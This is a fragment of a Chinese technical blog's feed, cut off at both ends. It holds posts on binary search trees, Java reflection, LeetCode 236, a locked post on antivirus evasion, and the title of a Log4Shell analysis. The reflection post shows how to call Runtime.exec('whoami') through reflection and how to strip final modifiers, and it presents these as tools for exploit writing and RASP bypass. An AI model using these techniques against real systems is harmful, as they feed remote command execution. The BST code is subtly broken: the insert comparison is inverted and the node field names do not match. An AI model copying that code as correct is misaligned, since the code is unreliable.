transform="translate(1152,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1450,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1935,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2412,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3012,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>{<br><span class="hljs-type">int</span> key;<br>TreeNode*left;<br>TreeNode*right;<br><span class="hljs-comment">// 维护其他信息，如高度，节点数量等</span><br>    <span class="hljs-type">int</span> size;   <span class="hljs-comment">// 当前节点为根的子树大小</span><br>    <span class="hljs-type">int</span> count;  <span class="hljs-comment">// 当前节点的重复数量</span><br><span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> value):<span class="hljs-built_in">key</span>(value),<span class="hljs-built_in">size</span>(<span class="hljs-number">1</span>),<span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>),<span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>),<span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>){<br>}<br>};<br></code></pre></td></tr></table></figure><p>由二叉树的定义，二叉搜索树的中序遍历结果可以得到一个非降的序列</p><p>在搜索二叉树中，搜索是相对容易的，当值大于这个节点时，向右子树搜索，反之向左子树搜索。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Search</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span> target)</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>){<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>}<br><span class="hljs-keyword">if</span> (root-&gt;value == target)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>}<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;value &gt; target)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(root-&gt;left,target);<br>}<span class="hljs-keyword">else</span>{<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Search</span>(root-&gt;right,target);<br>}<br>}<br></code></pre></td></tr></table></figure><p>在二叉搜索树中，插入、删除等操作都是基于搜索操作的</p><p>插入：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">}<br><span class="hljs-function">TreeNode *<span class="hljs-title">Insert</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span> value)</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>{<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>}<br><span class="hljs-keyword">if</span> (value &gt; root-&gt;key)<br>{<br>root-&gt;left = <span class="hljs-built_in">Insert</span>(root-&gt;left,value);<br>}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(value &lt; root-&gt;key)<br>{<br>root-&gt;right = <span class="hljs-built_in">Insert</span>(root-&gt;right,value);<br>}<br><span class="hljs-keyword">return</span> root;<br>}<br></code></pre></td></tr></table></figure><p>删除操作稍微复杂了一点，需要判断几种情况，假设这时我们已经找到了需要删除的节点<code>node</code></p><ol><li>当<code>node</code>为叶子节点时，直接删除</li><li>当<code>node</code>只有一个子节点时，返回仅存的那个子节点，然后直接删除<code>node</code></li><li>当<code>node</code>有两个子节点时，需要先找到<code>node</code>的前驱或者后继节点，返回这两个中的某一个，同时需要递归的删除此节点</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> </span>{<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>    {<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">if</span> ( key &gt; root-&gt;val ){<br>            root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right,key);<br>            <span class="hljs-keyword">return</span> root;<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( key &lt; root-&gt;val ){<br>            root-&gt;left = <span class="hljs-built_in">deleteNode</span>(root-&gt;left,key);<br>            <span class="hljs-keyword">return</span> root;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-comment">// 已经是叶子节点</span><br>            <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">nullptr</span>)<br>            {<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>            }<br>            <span class="hljs-comment">// 只有一个子节点</span><br>            <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span>)<br>            {<br>                <span class="hljs-keyword">return</span> root-&gt;right;<br>            }<br>            <span class="hljs-keyword">if</span> (root-&gt;right == <span class="hljs-literal">nullptr</span>){<br>                <span class="hljs-keyword">return</span> root-&gt;left;<br>            }<br>            TreeNode *successor = root-&gt;right;<br>            <span class="hljs-keyword">while</span>(successor-&gt;left)<br>            {<br>                successor = successor-&gt;left;<br>            }<br>            root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right,successor-&gt;val);<br>            successor-&gt;left = root-&gt;left;<br>            successor-&gt;right = root-&gt;right;<br>            <span class="hljs-keyword">return</span> successor;<br>        }<br>    }<br>    <span class="hljs-keyword">return</span> root;<br>}<br></code></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题意思很明显，找差值最小，按照中序遍历的二叉搜索树自然递增，所以中序遍历接口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ANS</span><span class="hljs-params">(TreeNode *root,<span class="hljs-type">int</span>&amp; pre, <span class="hljs-type">int</span>&amp; ans)</span></span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br>    {<br>        <span class="hljs-keyword">return</span>;<br>    }<br>    <span class="hljs-built_in">ANS</span>(root-&gt;left,pre,ans);<br>    <span class="hljs-keyword">if</span> (pre == <span class="hljs-number">-1</span>)<br>    {<br>        pre = root-&gt;val;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        ans = <span class="hljs-built_in">min</span>(ans,root-&gt;val - pre);<br>        pre = root-&gt;val;<br>    }<br>    <span class="hljs-built_in">ANS</span>(root-&gt;right,pre,ans);<br>}<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMinimumDifference</span><span class="hljs-params">(TreeNode* root)</span> </span>{<br>    <span class="hljs-type">int</span> ans = INT_MAX,pre = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">ANS</span>(root,pre,ans);<br>    <span class="hljs-keyword">return</span> ans;<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反射机制</title>
    <link href="/2024/06/17/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/06/17/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>在Java安全方面的一个重要机制，著名的Spring框架也是基于此。</p><span id="more"></span><p>Java反射(<code>Reflection</code>)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(<code>Methods</code>)、成员变量(<code>Fields</code>)、构造方法(<code>Constructors</code>)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><p>Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>首先我们需要知道的是，在Java中一切皆对象，“类”本身也是被抽象成为一个类，称为<code>Class</code>类，每个类都会有一个类对象，每当编译一个新类就产生一个<code>Class</code>对象，也就是<code>Class</code>类的实例。</p><p><code>Class</code> 类只有一个私有的构造方法，不能通过 <code>new</code> 关键字来创建，而是在类加载的时候由 <code>Java</code> 虚拟机以及类加载器来自动构造的。</p><p>Java反射操作的基础就是<code>java.lang.Class</code>对象，通常有如下3种方法：</p><ol><li><code>类名.class</code></li><li><code>Class.forName("com.example.test")</code></li><li><code>classLoader.loadClass("com.example.test")</code></li></ol><p>对于数组类型的Class对象需要特殊注意,需要使用Java类型的描述符方式，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; doubleArray = Class.forName(<span class="hljs-string">"[D"</span>);<span class="hljs-comment">//相当于double[].class</span><br>Class&lt;?&gt; cStringArray = Class.forName(<span class="hljs-string">"[[Ljava.lang.String;"</span>);<span class="hljs-comment">// 相当于String[][].class</span><br></code></pre></td></tr></table></figure><p>当需要调用内部类时，使用<code>$</code>代替<code>.</code>，比如test类有一个内部类t，那么这样获取：</p><p><code>Class t = class.forName("com.example.test$t")</code></p><h3 id="反射执行系统命令"><a href="#反射执行系统命令" class="headerlink" title="反射执行系统命令"></a>反射执行系统命令</h3><p>在Java中，执行系统命令通常使用<code>java.lang.Runtime</code>库中的<code>exec</code>函数实现，那么通过反射执行系统命令需要以下几个步骤：</p><ol><li>获取<code>Runtime.class</code></li><li>创建<code>Runtime.class</code>的构造方法，创建实例</li><li>获取<code>Runtime</code>类的函数<code>exec</code></li><li>通过<code>invoke</code>函数执行<code>exec</code>函数</li></ol><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取Runtime类对象</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">rC</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"java.lang.Runtime"</span>);<br><span class="hljs-comment">// 获取构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> rC.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> rC.getMethod(<span class="hljs-string">"exec"</span>, String.class);<br><span class="hljs-comment">// 调用exec方法，等价于 rt.exec(cmd);</span><br><span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Process) runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">"whoami"</span>);<br><span class="hljs-comment">// 获取命令执行结果</span><br><span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br><span class="hljs-comment">// 输出命令执行结果</span><br>System.out.println(org.apache.commons.io.IOUtils.toString(in, <span class="hljs-string">"UTF-8"</span>));<br></code></pre></td></tr></table></figure><h3 id="反射创建类实例"><a href="#反射创建类实例" class="headerlink" title="反射创建类实例"></a>反射创建类实例</h3><p>在Java的<code>任何一个类都必须有一个或多个构造方法</code>，如果代码中没有创建构造方法那么在类编译的时候会自动创建一个无参数的构造方法。</p><p>在反射机制中，有两个函数可以获取到类构造器：</p><ol><li><code>getDeclaredConstructor</code>：可以获取到类的私有构造方法</li><li><code>getConstructor</code>：只能获取公有的构造器</li></ol><p>如果构造方法有一个或多个参数的情况下，应该在获取构造方法时候传入对应的参数类型数组。</p><p>如：<code>clazz.getDeclaredConstructor(String.class, String.class)</code>。</p><p>获取类的所有构造方法：<code>clazz.getDeclaredConstructors</code>来获取一个<code>Constructor</code>数组。</p><p>当我们没有访问构造方法权限时我们应该调用<code>constructor.setAccessible(true)</code>修改访问权限就可以成功的创建出类实例了。</p><p>获取到构造器之后，可以使用<code>constructor.newInstance()</code>来创建类实例。</p><h3 id="反射调用类的方法"><a href="#反射调用类的方法" class="headerlink" title="反射调用类的方法"></a>反射调用类的方法</h3><p><code>Class</code>对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。</p><p><strong>获取当前类所有的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Method[] methods = clazz.getDeclaredMethods()<br></code></pre></td></tr></table></figure><p><strong>获取当前类指定的成员方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">"方法名"</span>, 参数类型如String.class，多个参数用<span class="hljs-string">","</span>号隔开);<br></code></pre></td></tr></table></figure><p><code>getMethod</code>和<code>getDeclaredMethod</code>都能够获取到类成员方法，区别在于<code>getMethod</code>只能获取到<code>当前类和父类</code>的所有有权限的方法(如：<code>public</code>)，而<code>getDeclaredMethod</code>能获取到当前类的所有成员方法(不包含父类)。</p><p><strong>反射调用方法</strong></p><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><p><strong>调用类方法代码片段：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="hljs-string">","</span>隔开);<br></code></pre></td></tr></table></figure><p><code>method.invoke</code>的第一个参数必须是类实例对象，<strong>如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在java中调用静态方法是不需要有类实例的</strong>，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</p><p><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，<strong>如果有参数那么就必须严格的依次传入对应的参数类型</strong>。</p><h3 id="反射调用成员变量"><a href="#反射调用成员变量" class="headerlink" title="反射调用成员变量"></a>反射调用成员变量</h3><p>这个其实在Java安全领域没有太大的作用，姑且列在这里，毕竟开发才是大头。</p><p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p><p><strong>获取当前类的所有成员变量：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> clazz.getDeclaredFields();<br></code></pre></td></tr></table></figure><p><strong>获取当前类指定的成员变量：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span>  <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">"变量名"</span>);<br></code></pre></td></tr></table></figure><p><code>getField</code>和<code>getDeclaredField</code>的区别同<code>getMethod</code>和<code>getDeclaredMethod</code>。</p><p><strong>获取成员变量值：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(类实例对象);<br></code></pre></td></tr></table></figure><p><strong>修改成员变量值：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure><p>同理，当我们没有修改的成员变量权限时可以使用: <code>field.setAccessible(true)</code>的方式修改为访问成员变量访问权限。</p><p>如果我们需要修改被<code>final</code>关键字修饰的成员变量，那么我们需要先修改方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取Field类的modifiers</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> field.getClass().getDeclaredField(<span class="hljs-string">"modifiers"</span>); <br><span class="hljs-comment">// 设置modifiers修改权限</span><br>modifiers.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 修改成员变量的Field对象的modifiers值</span><br>modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);<br><span class="hljs-comment">// 修改成员变量值</span><br>field.set(类实例对象, 修改后的值);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀学习记录</title>
    <link href="/2024/06/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/06/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="65ac4630fb6837ff87e684cb9300934c913e4fbf242c91797ff370df4ae70586"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>红蓝对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode236复习二叉树的祖先节点</title>
    <link href="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/"/>
    <url>/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>祖先节点QAQ</p><span id="more"></span><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>首先，题目是要找二叉树的最近公共祖先，给出的定义是：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p><img src="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/Snipaste_2024-06-14_21-33-06.png" class=""><h3 id="祖先节点"><a href="#祖先节点" class="headerlink" title="祖先节点"></a>祖先节点</h3><p>一个节点的祖先我简单理解为，这个节点向上回溯过程中遇到的所有节点，直到根节点为止。</p><p>两个节点的公共祖先节点我简单理解为，这两个节点回溯路径中重合的节点，直到根节点为止。</p><p>最近的公共祖先节点我简单理解为，重合节点中高度最小（深度最大）的节点。在判断中，可以认为一个公共祖先节点的左右子节点均不再是公共祖先节点，那么这个节点就是最近的公共祖先节点。</p><p>解题：</p><p>对于二叉树类的题目，一般就采用递归遍历的方式，这道题选择DFS，当我们遇到需要寻找的节点时，就返回这个节点，然后向下遍历左子树和右子树，得到遍历结果left和right。</p><p>此时left无非三种结果：null,p,q；同理right也是。</p><ul><li>当两者皆为空时，说明不存在，返回空即可</li><li>当left为空时，说明p或q某一个在当前root节点右侧，且可以保证当p和q在同一侧时，返回的总是p、q中深度小的那个，反之right为空同理</li><li>当两者均不为空时，因为是回溯的，所以第一次运行到最后的<code>return root</code>，说明当前的root节点是最近公共祖先节点</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>{<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span> || root == p || root == q)<br>        {<br>            <span class="hljs-keyword">return</span> root;<br>        }<br>        TreeNode *left = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);<br>        TreeNode *right = <span class="hljs-built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> right;<br>        <span class="hljs-keyword">if</span> (right == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> left;<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228分析</title>
    <link href="/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/"/>
    <url>/2024/06/10/CVE-2021-44228%E5%88%86%E6%9E%90/</url>
    
